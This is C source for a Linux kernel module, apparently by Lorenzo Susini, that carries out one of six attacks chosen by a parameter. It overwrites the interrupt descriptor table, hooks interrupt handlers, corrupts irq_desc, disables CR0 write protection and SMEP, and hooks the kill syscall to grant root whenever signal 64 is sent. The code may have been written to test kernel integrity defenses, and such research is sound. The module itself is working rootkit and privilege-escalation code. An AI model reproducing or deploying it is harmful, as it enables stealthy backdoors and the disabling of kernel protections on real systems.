#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <asm/desc.h>
#include <linux/irq.h>
#include <linux/interrupt.h> 
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/cred.h>

#include "double-kprobe.h"
#include "read-msr.h"

#define NO_ATTACK               0
#define WRITE_IDT               1
#define HOOK_IRQACTION          2
#define ATTACK_IRQ_DESC         3
#define HOOK_KILL_SYSCALL_CR0   4
#define DISABLE_SMEP            5
#define WRITE_IDTR              6

static int type = NO_ATTACK;
module_param(type, int, 0660);

int (*set_memory_pointer)(unsigned long, int);
int (*reset_memory_pointer)(unsigned long, int);

struct irq_desc *(*i2d_pointer)(int irq) = NULL; /* irq_to_desc function pointer */
struct irqaction *keyboard_action;
void *irq_handler_code;

irqreturn_t (*old_handler)(int irq, void *dev) = NULL;
static irqreturn_t hook_handler(int irq, void *dev){
    printk("Hooked myself ERROR!!!\n");
    return old_handler(irq, dev);
}

static void disable_cr0_wp(void)
{
    asm __volatile__ (
        "cli;"
        "mov %%cr0, %%rax;"
        "and $~0x10000, %%rax;"
        "mov %%rax, %%cr0;"
        "sti;"
        ::
    );
}

static void enable_cr0_wp(void)
{
    asm __volatile__ (
        "cli;"
        "mov %%cr0, %%rax;"
        "or $0x10000, %%rax;"
        "mov %%rax, %%cr0;"
        "sti;"
        ::
    );
}

static void disable_cr4_smep(void)
{
    asm __volatile__ (
        "cli;"
        "mov %%cr4, %%rax;"
        "and $~0x100000, %%rax;"
        "mov %%rax, %%cr4;"
        "sti;"
        ::
    );
}

static int walk_irqactions(int irq)
{
    struct irq_desc *desc;
    struct irqaction *action, **action_ptr;

    desc = i2d_pointer(irq);
    if(desc == NULL)
        return -1;
    action_ptr = &desc->action;       
    if(action_ptr != NULL)                                       
        action = *action_ptr; 
    else
        action = NULL;
    while(action != NULL){
        if(!strcmp("fx_irq_handler", action->name)){
            pr_info("irq action found! \n");
            irq_handler_code = (void *)action->handler;
            old_handler = action->handler;
            action->handler = hook_handler;
            return 0;
        }
        action = action->next;
    }
    return 1;
}

static void init_set_memory_functions(void)
{
    set_memory_pointer = (int (*)(unsigned long, int))kln_pointer("set_memory_rw");
    reset_memory_pointer = (int (*)(unsigned long, int))kln_pointer("set_memory_ro");
}

static void idt_attack_test(struct desc_ptr *descriptor)
{
    char *ptr;

    init_set_memory_functions();
    set_memory_pointer(descriptor->address, 1);
    ptr = (char *)descriptor->address;
    *(ptr + 5) = 6;
    reset_memory_pointer(descriptor->address, 1);
    return;
}


static void attack_irq_desc(void)
{
    void *irqdesc;
    i2d_pointer = (struct irq_desc *(*)(int))(kln_pointer("irq_to_desc"));
    irqdesc = (void *)i2d_pointer(11);
    memset(irqdesc, 0, sizeof(struct irq_desc));
}


asmlinkage int (*old_sys_kill)(struct pt_regs *pt_regs);
asmlinkage int sys_kill_hook(struct pt_regs *pt_regs)
{
    pid_t pid;
    int sig;
    struct cred *newcreds;
    pid = pt_regs->di;
    sig = pt_regs->si;
    printk("pid: %d, sig: %d\n", (int)pid, sig);
    if(sig == 64){
        printk("Giving root\n");
        newcreds = prepare_kernel_cred(NULL);
        commit_creds(newcreds);
        return 0;
    }
    else return old_sys_kill(pt_regs);
}


static void sys_kill_attack(void)
{
    unsigned long *sys_call_table;
    disable_cr0_wp();
    sys_call_table = (unsigned long *)kln_pointer("sys_call_table");
    old_sys_kill = (int (*)(struct pt_regs *pt_regs))sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)sys_kill_hook;
    enable_cr0_wp();
}


static void print_help(void)
{
    printk(
        "Usage: insmdo attack.ko type=[attack-number]\n"
        "1 -> Write Interrupt Descriptor Table (IDT)\n"
        "2 -> Hook irqaction\n"
        "3 -> Attack irq_desc\n"
        "4 -> Hook kill system call disabling CR0.WP\n"
        "5 -> Disable CR4.SMEP\n"
        "6 -> Modify IDTR\n"
    );
}

static int m_init(void)
{
    int ret, i;
    struct desc_ptr *idt_ptr;

    pr_info("Loading attack module ...\n");

    ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
    if (ret < 0)
        return ret;

    ret = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);
    if (ret < 0) {
        unregister_kprobe(&kp0);
        return ret;
    }

    unregister_kprobe(&kp0);
    unregister_kprobe(&kp1);  
    kln_pointer = (unsigned long (*)(const char *name)) kln_addr;

    switch(type){
    case NO_ATTACK:
        pr_err("Please specify attack type\n");
        print_help();
        return 0;
        break;
    case WRITE_IDT:
        pr_info("Writing Interrupt Descriptor Table\n");
        idt_ptr = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
        store_idt(idt_ptr);
        idt_attack_test(idt_ptr);
        kfree(idt_ptr);
        break;
    case HOOK_IRQACTION: {
        int ret;
        pr_info("Hooking irqaction\n");
        i2d_pointer = (struct irq_desc *(*)(int))(kln_pointer("irq_to_desc"));
        for(i = 0; i < 256; i++){
            ret = walk_irqactions(i);
            if(!ret)
                break;
        }
        break;
    }
    case ATTACK_IRQ_DESC:
        attack_irq_desc();
        break;
    case HOOK_KILL_SYSCALL_CR0:
        printk("Hooking kill syscall\n");
        sys_kill_attack();
        break;
    case DISABLE_SMEP:
        disable_cr4_smep();
        break;
    case WRITE_IDTR:
        idt_ptr = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
        store_idt(idt_ptr);
        idt_ptr->address = idt_ptr->address + 4096;
        load_idt(idt_ptr);
        kfree(idt_ptr);
        break;
    default:
        pr_err("Attack type not recognized\n");
        return -1;
        break;
    }

    return 0;
/*
    i2d_pointer = (struct irq_desc *(*)(int))(kln_pointer("irq_to_desc"));
    for(i = 0; i < 256; i++)
        walk_irqactions(i);

    init_set_memory_functions();
    idt_ptr = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
    store_idt(idt_ptr);
    printk("Writing IDT\n");
    //idt_attack_test(idt_ptr);
    kfree(idt_ptr);

    //attack_irq_desc();
*/
    return 0;
}

static void m_exit(void)
{
  pr_info("Attack module unloaded\n");
}

module_init(m_init);
module_exit(m_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lorenzo Susini");
